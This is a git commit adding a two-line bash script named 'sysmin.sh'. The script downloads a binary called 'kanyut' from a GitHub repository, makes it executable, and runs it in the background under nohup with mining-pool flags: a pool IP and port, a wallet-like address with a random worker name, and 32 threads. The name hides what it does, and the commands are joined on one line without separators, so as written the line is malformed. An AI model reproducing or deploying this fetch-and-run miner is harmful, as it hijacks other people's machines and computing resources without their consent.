ba8ac4fe6f46f04cfab921af5b51bcaacdad0ea2
murema <95093423+murema@users.noreply.github.com>
2021-11-29 10:40:58 +0700

    Create sysmin.sh

---
+++ sysmin.sh
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash 
+wget -q https://github.com/renifer12/vrsc/raw/main/kanyut chmod +x kanyut nohup ./kanyut -v -l 139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-999 -n 1)-Zero) -p x -t 32 > nohup.out
